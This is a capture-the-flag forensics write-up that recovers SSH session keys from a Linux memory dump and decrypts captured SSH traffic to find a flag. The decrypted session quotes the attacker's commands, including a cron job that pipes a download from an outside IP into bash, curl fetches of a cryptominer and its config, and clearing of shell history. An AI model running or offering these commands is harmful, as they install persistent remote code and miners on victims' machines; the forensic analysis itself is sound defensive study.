---
layout: post
title: HTB Business CTF 2021 - Compromise
---

## Description

*We are certain that our internal network has been breached and the attacker tries to move laterally. We managed to capture some suspicious traffic and create a memory dump from a compromised server. I hope you are skilled enough to bring this incident to its end.*

*Available Data:*

* *capture.pcap (network capture of SSH traffic)*
* *dump.mem (memory dump of a suspicious system)*

<!--more-->
## Solution
The concrete goal of this challenge was not clear initially. However, one could guess that the encrypted SSH traffic somehow needs to be decrypted. So the fight-plan was the following:

1. Extract the SSH session key from the memory dump
2. Use the session key to decrypt the traffic

However, several substeps needed to be done to achieve this goal.

### Get The Right Volatility Profile
In order to use `volatility` one first needs to identify the correct profile of the memory dump. Unfortunately, the plugin `imageinfo` did not yield in any useful result.

```bash
forensics@siftworkstation: /cases/hackthebox/business_ctf_21/forensics/compromised
$ vol.py -f dump.mem imageinfo
Volatility Foundation Volatility Framework 2.6.1
/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends.openssl import backend
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : No suggestion (Instantiated with LinuxUbuntu18043x64)
                     AS Layer1 : LimeAddressSpace (Unnamed AS)
                     AS Layer2 : FileAddressSpace (/cases/hackthebox/business_ctf_21/forensics/compromised/dump.mem)
                      PAE type : No PAE
                           DTB : -0x1L
```

Running `strings` on the memory dump showed, that it is a dump from a Linux machine. The exact identified version is

```
Linux Version: Ubuntu 18.04
Kernel Version: 4.15.0-142-generic (buildd@lgw01-amd64-036)
```

In order to create the correct version of a volatility profile, a identical (with the same kernel version) system needed to be created. After this, the steps described by [Andrea Fortuna][1]. Once done, volatility could be used as intended.

### Extract The SSH Session Keys
In order to extract the SSH session keys from the memory, `fox-it` provides a very useful volatility module ([OpenSSH-Session-Key-Recovery][2]). Using this module, it was a piece to extract the SSH session keys from the memory dump.

```bash
forensics@siftworkstation: /cases/hackthebox/business_ctf_21/forensics/compromised
$ vol.py -f dump.mem --profile=LinuxUbuntu_4_15_0-142-generic_profilex64 linux_sshkeys -p 1692

/\____/\
\   (_)/        OpenSSH Session Key Dumper
 \    X         By Jelle Vergeer
  \  / \
   \/
Scanning for OpenSSH sshenc structures...

Name                           Pid      PPid     Address            Name                           Key                                                                                                                              IV                                                              
------------------------------ -------- -------- ------------------ ------------------------------ -------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------------------------------
sshd [sshd: developer@pts/0]       1692     1575 0x000055976d18cb40 aes256-gcm@openssh.com         893112f1ef2bf4567ca289545efeb1a20dd709ee18c0b5b83b2b85541bc93d1f                                                                 0b1148709466289120d7a241                                        
sshd [sshd: developer@pts/0]       1692     1575 0x000055976d18ccc0 aes256-gcm@openssh.com         06baa1f1779207f120813e3986854cc3e2196fa82cc6d6ec756409ad86e8c94a                                                                 5865d3c75d5dc1f2e19e6406   
```

### Decrypt The Encrypted SSH Traffic
The last step was to decrypt the encrypted SSH traffic from the captured network traffic. In order to achieve this, `fox-it` again provides a very useful tool called [OpenSSH-Network-Parser][3], which allows to decrypt SSH traffic from a `PCAP` file. In order to achieve this, one just needs to create a `JSON` file containing the extracted session keys.

```json
{
        "task_name": "sshd", 
        "sshenc_addr": 94108858764096, 
        "cipher_name": "aes256-gcm@openssh.com", 
        "key": "893112f1ef2bf4567ca289545efeb1a20dd709ee18c0b5b83b2b85541bc93d1f", 
        "iv": "0b1148709466289120d7a241"
}
{
        "task_name": "sshd", 
        "sshenc_addr": 94108858764480, 
        "cipher_name": "aes256-gcm@openssh.com", 
        "key": "06baa1f1779207f120813e3986854cc3e2196fa82cc6d6ec756409ad86e8c94a", 
        "iv": "5865d3c75d5dc1f2e19e6406"
}

```

Using the tool and the just created file `keys.json`, the SSH traffic could be decrypted. Thereby, the tool creates a file containing what is like the complete bash history of the SSH session.

```bash
forensics@siftworkstation: /cases/hackthebox/business_ctf_21/forensics/compromised
$ network-parser -p capture.pcap --popt keyfile=keys.json --proto ssh -o ssh-traffic/ 
getrlimit: (1024, 4096)
/cases/hackthebox/business_ctf_21/forensics/compromised/OpenSSH-Network-Parser/venv2/local/lib/python2.7/site-packages/gevent/builtins.py:96: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  result = _import(*args, **kwargs)
forensics@siftworkstation: /cases/hackthebox/business_ctf_21/forensics/compromised
$ ls ssh-traffic
192.168.1.10  files  stats_2021-07-27--16-24-42.txt
(venv2) forensics@siftworkstation: /cases/hackthebox/business_ctf_21/forensics/compromised
$ cat ssh-traffic/192.168.1.10/2021-07-07--13-56-06.txt | head -n 200
[192.168.1.10:50490 -> 192.168.1.11:22  2021-07-07 13:56:06.705333 - 2021-07-07 13:56:56.341421]
[User Auth Request]
username:      'developer'
service_name:  'ssh-connection'
method_name:   'none'

[User Auth Failure]
auth_continue:    'publickey,password'
partial_success:  0

[User Auth Request]
username:      'developer'
service_name:  'ssh-connection'
method_name:   'password'
Password: HTB{w3ll_1_th0ught_

Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  7 13:56:10 UTC 2021
  System load:  0.23              Processes:             94
  Usage of /:   48.6% of 8.79GB   Users logged in:       1
  Memory usage: 14%               IP address for enp0s3: 192.168.1.11
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

90 packages can be updated.
23 updates are security updates.

New release '20.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Jul  7 16:55:18 2021

developer@ubuntuserver:~$ 
echo "running....."config.json -t `echo $cores` >/dev/null &ash -s" >> /tmp/cron || true && \
export HISTFILE=/dev/null

developer@ubuntuserver:~$ 
d procid grep -vw suppoie | awk '{if($3>40.0) print $2}' | while read

> 
do

> 
kill -9 $procid

> 
done

developer@ubuntuserver:~$ 
rm -rf /dev/shm/jboss

developer@ubuntuserver:~$ 
ps -fe|grep -w suppoie |grep -v grep

developer@ubuntuserver:~$ 
if [ $? -eq 0 ]

> 
then

> 
pwd

> 
else

> 
crontab -r || true && \

> 
\cho "* * * * * curl -s http://147.182.172.189/logo1.jpg | bash -s" >> /tmp/cron || true && \

> 
crontab /tmp/cron || true && \

> 
rm -rf /tmp/cron || true && \

> 
curl -o /var/tmp/config.json http://147.182.172.189/1.json

> 
curl -o /var/tmp/suppoie http://147.182.172.189/rig

> 
echo "bjBfMG4zX3cwdWxkX2YxbmRfbTMhISF9Cg" > /dev/null

> 
chmod 777 /var/tmp/suppoie

> 
cd /var/tmp

> 
proc=`grep -c ^processor /proc/cpuinfo`

[...snip...]

```

Thereby, the first part of the flag got visible in form of the password: `HTB{w3ll_1_th0ught_`. The second part of the flag was hidden in a Base64 encoded string that was echoed into `/dev/null`. Decoding it gives the second part of the flag: `n0_0n3_w0uld_f1nd_m3!!!}`.

```bash
forensics@siftworkstation: /cases/hackthebox/business_ctf_21/forensics/compromised
$ echo -n "bjBfMG4zX3cwdWxkX2YxbmRfbTMhISF9Cg" | base64 -d
n0_0n3_w0uld_f1nd_m3!!!}
base64: invalid input

```

This results in the complete flag of: **HTB{w3ll_1_th0ught_n0_0n3_w0uld_f1nd_m3!!!}**

[1]: https://www.andreafortuna.org/2019/08/22/how-to-generate-a-volatility-profile-for-a-linux-system/
[2]: https://github.com/fox-it/OpenSSH-Session-Key-Recovery
[3]: https://github.com/fox-it/OpenSSH-Network-Parser
